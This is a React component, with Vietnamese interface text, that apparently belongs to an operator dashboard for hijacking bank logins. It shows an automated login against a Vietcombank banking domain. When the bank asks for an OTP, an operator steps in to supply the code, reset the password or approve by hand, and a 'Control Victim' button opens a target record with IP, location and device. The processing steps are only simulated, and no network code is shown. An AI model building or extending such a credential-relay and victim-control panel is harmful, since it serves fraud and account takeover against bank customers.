/**
 * Auto Login Workflow Integration Component
 * Tích hợp workflow: User → Auto Login → Admin giám sát → Can thiệp → Xử lý
 */

import React, { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Badge } from "../ui/badge";
import { motion, AnimatePresence } from "framer-motion";
import {
  ArrowRight,
  User,
  Bot,
  Shield,
  Settings,
  CheckCircle,
  AlertTriangle,
  Clock,
  Eye,
  Key,
  RotateCcw,
  Play,
  Pause,
  XCircle,
  Globe,
  Monitor,
  Activity,
  Zap
} from "lucide-react";
import { format } from "date-fns";
import { vi } from "date-fns/locale";
import toast from "react-hot-toast";

const AutoLoginWorkflow = ({ onInterventionRequired, onVictimControlOpen }) => {
  const [workflowSteps, setWorkflowSteps] = useState([
    {
      id: "user_request",
      title: "User Request",
      description: "Người dùng yêu cầu auto login",
      icon: User,
      status: "completed",
      timestamp: new Date("2025-01-15T08:15:00"),
      details: "Target: banking.vietcombank.com.vn"
    },
    {
      id: "auto_login",
      title: "Auto Login Process",
      description: "Hệ thống thực hiện auto login",
      icon: Bot,
      status: "in_progress",
      timestamp: new Date("2025-01-15T08:15:30"),
      details: "Đang điền form đăng nhập..."
    },
    {
      id: "admin_monitor",
      title: "Admin Monitoring",
      description: "Admin giám sát quá trình",
      icon: Eye,
      status: "active",
      timestamp: new Date("2025-01-15T08:16:00"),
      details: "Phát hiện cần OTP"
    },
    {
      id: "intervention",
      title: "Admin Intervention",
      description: "Admin can thiệp khi cần",
      icon: Shield,
      status: "waiting",
      timestamp: null,
      details: "Chờ admin cung cấp OTP"
    },
    {
      id: "processing",
      title: "Final Processing",
      description: "Xử lý cuối cùng (OTP/Duyệt/Reset)",
      icon: Settings,
      status: "pending",
      timestamp: null,
      details: "Chờ hoàn thành can thiệp"
    }
  ]);

  const [currentStep, setCurrentStep] = useState("admin_monitor");
  const [interventionData, setInterventionData] = useState({
    type: "otp_required",
    otpValue: "",
    reason: "Hệ thống yêu cầu mã OTP để hoàn thành đăng nhập"
  });

  const getStepIcon = (step) => {
    const Icon = step.icon;
    const iconProps = {
      className: `h-6 w-6 ${
        step.status === 'completed' ? 'text-green-400' :
        step.status === 'in_progress' ? 'text-blue-400' :
        step.status === 'active' ? 'text-yellow-400' :
        step.status === 'waiting' ? 'text-orange-400' :
        'text-slate-500'
      }`
    };
    
    return <Icon {...iconProps} />;
  };

  const getStepStatus = (step) => {
    const statusConfig = {
      completed: { color: "bg-green-500/20 text-green-400", label: "Hoàn thành" },
      in_progress: { color: "bg-blue-500/20 text-blue-400", label: "Đang xử lý" },
      active: { color: "bg-yellow-500/20 text-yellow-400", label: "Đang giám sát" },
      waiting: { color: "bg-orange-500/20 text-orange-400", label: "Chờ can thiệp" },
      pending: { color: "bg-slate-500/20 text-slate-400", label: "Chờ xử lý" }
    };

    const config = statusConfig[step.status] || statusConfig.pending;
    return <Badge className={config.color}>{config.label}</Badge>;
  };

  const handleIntervention = (action) => {
    switch (action) {
      case 'provide_otp':
        if (!interventionData.otpValue) {
          toast.error("Vui lòng nhập mã OTP");
          return;
        }
        
        setWorkflowSteps(prev => prev.map(step => {
          if (step.id === 'intervention') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: `Đã cung cấp OTP: ${interventionData.otpValue}`
            };
          }
          if (step.id === 'processing') {
            return {
              ...step,
              status: 'in_progress',
              timestamp: new Date(),
              details: 'Đang xử lý OTP...'
            };
          }
          return step;
        }));
        
        setCurrentStep('processing');
        toast.success(`Đã cung cấp OTP: ${interventionData.otpValue}`);
        
        // Simulate processing completion
        setTimeout(() => {
          setWorkflowSteps(prev => prev.map(step => 
            step.id === 'processing' 
              ? { ...step, status: 'completed', details: 'Đăng nhập thành công!' }
              : step
          ));
          toast.success("Đăng nhập thành công!");
        }, 3000);
        break;

      case 'reset_password':
        setWorkflowSteps(prev => prev.map(step => {
          if (step.id === 'intervention') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: 'Đã thực hiện reset mật khẩu'
            };
          }
          if (step.id === 'processing') {
            return {
              ...step,
              status: 'in_progress',
              timestamp: new Date(),
              details: 'Đang reset mật khẩu...'
            };
          }
          return step;
        }));
        
        toast.success("Đã thực hiện reset mật khẩu");
        break;

      case 'manual_approval':
        setWorkflowSteps(prev => prev.map(step => {
          if (step.id === 'intervention') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: 'Admin đã duyệt thủ công'
            };
          }
          if (step.id === 'processing') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: 'Đã duyệt và hoàn thành'
            };
          }
          return step;
        }));
        
        toast.success("Đã duyệt thủ công");
        break;

      case 'abort':
        setWorkflowSteps(prev => prev.map(step => {
          if (step.id === 'intervention') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: 'Admin đã hủy quá trình'
            };
          }
          if (step.id === 'processing') {
            return {
              ...step,
              status: 'completed',
              timestamp: new Date(),
              details: 'Quá trình đã bị hủy'
            };
          }
          return step;
        }));
        
        toast.error("Đã hủy quá trình auto login");
        break;
    }
  };

  const openVictimControl = () => {
    if (onVictimControlOpen) {
      onVictimControlOpen({
        id: "Target_User_001",
        ip: "192.168.1.50",
        location: "Hà Nội, VN",
        device: "Windows 11 - Chrome 120",
        status: "online",
        os: "Windows 11",
        browser: "Chrome 120",
        lastSeen: format(new Date(), "HH:mm:ss")
      });
    }
  };

  return (
    <Card className="bg-gradient-to-br from-slate-900/95 to-slate-800/95 border-slate-700">
      <CardHeader>
        <CardTitle className="flex items-center justify-between text-white">
          <div className="flex items-center gap-2">
            <Activity className="h-5 w-5 text-blue-400" />
            <span>Auto Login Workflow</span>
          </div>
          <div className="flex items-center gap-2">
            <Badge className="bg-blue-500/20 text-blue-400">
              Step {workflowSteps.findIndex(s => s.status === 'active' || s.status === 'waiting') + 1}/5
            </Badge>
            <Button
              size="sm"
              variant="outline"
              onClick={openVictimControl}
              className="text-green-400 border-green-400 hover:bg-green-400/10"
            >
              <Monitor className="h-4 w-4 mr-1" />
              Control Victim
            </Button>
          </div>
        </CardTitle>
      </CardHeader>

      <CardContent className="space-y-6">
        {/* Workflow Steps */}
        <div className="space-y-4">
          {workflowSteps.map((step, index) => (
            <motion.div
              key={step.id}
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: index * 0.1 }}
              className={`
                flex items-center gap-4 p-4 rounded-lg border transition-all
                ${step.status === 'active' || step.status === 'waiting' 
                  ? 'bg-slate-800/70 border-blue-500/50 shadow-lg' 
                  : 'bg-slate-800/30 border-slate-700'
                }
              `}
            >
              {/* Step Icon */}
              <div className={`
                flex items-center justify-center w-12 h-12 rounded-full
                ${step.status === 'completed' ? 'bg-green-500/20' :
                  step.status === 'in_progress' ? 'bg-blue-500/20' :
                  step.status === 'active' ? 'bg-yellow-500/20' :
                  step.status === 'waiting' ? 'bg-orange-500/20' :
                  'bg-slate-500/20'
                }
              `}>
                {getStepIcon(step)}
              </div>

              {/* Step Content */}
              <div className="flex-1">
                <div className="flex items-center gap-3 mb-1">
                  <h3 className="font-medium text-white">{step.title}</h3>
                  {getStepStatus(step)}
                </div>
                <p className="text-sm text-slate-400 mb-1">{step.description}</p>
                <p className="text-xs text-slate-500">{step.details}</p>
                {step.timestamp && (
                  <p className="text-xs text-slate-500 mt-1">
                    {format(step.timestamp, "HH:mm:ss dd/MM/yyyy", { locale: vi })}
                  </p>
                )}
              </div>

              {/* Arrow */}
              {index < workflowSteps.length - 1 && (
                <ArrowRight className="h-5 w-5 text-slate-600" />
              )}
            </motion.div>
          ))}
        </div>

        {/* Intervention Panel */}
        {currentStep === 'admin_monitor' && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4"
          >
            <div className="flex items-center gap-2 mb-3">
              <AlertTriangle className="h-5 w-5 text-orange-400" />
              <h3 className="font-medium text-orange-400">Cần Can Thiệp</h3>
            </div>
            
            <p className="text-sm text-slate-300 mb-4">
              {interventionData.reason}
            </p>

            <div className="space-y-3">
              {interventionData.type === 'otp_required' && (
                <div className="flex items-center gap-3">
                  <Input
                    placeholder="Nhập mã OTP..."
                    value={interventionData.otpValue}
                    onChange={(e) => setInterventionData(prev => ({
                      ...prev,
                      otpValue: e.target.value
                    }))}
                    className="flex-1 bg-slate-800 border-slate-600 text-white"
                  />
                  <Button
                    onClick={() => handleIntervention('provide_otp')}
                    className="bg-green-600 hover:bg-green-700"
                  >
                    <Key className="h-4 w-4 mr-1" />
                    Gửi OTP
                  </Button>
                </div>
              )}

              <div className="flex flex-wrap gap-2">
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => handleIntervention('manual_approval')}
                  className="text-blue-400 border-blue-400 hover:bg-blue-400/10"
                >
                  <CheckCircle className="h-4 w-4 mr-1" />
                  Duyệt thủ công
                </Button>
                
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => handleIntervention('reset_password')}
                  className="text-yellow-400 border-yellow-400 hover:bg-yellow-400/10"
                >
                  <RotateCcw className="h-4 w-4 mr-1" />
                  Reset Password
                </Button>
                
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => handleIntervention('abort')}
                  className="text-red-400 border-red-400 hover:bg-red-400/10"
                >
                  <XCircle className="h-4 w-4 mr-1" />
                  Hủy bỏ
                </Button>
              </div>
            </div>
          </motion.div>
        )}

        {/* Real-time Status */}
        <div className="bg-slate-800/50 rounded-lg p-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
              <span className="text-sm text-slate-300">Real-time monitoring active</span>
            </div>
            <div className="text-xs text-slate-500">
              Last update: {format(new Date(), "HH:mm:ss")}
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default AutoLoginWorkflow;
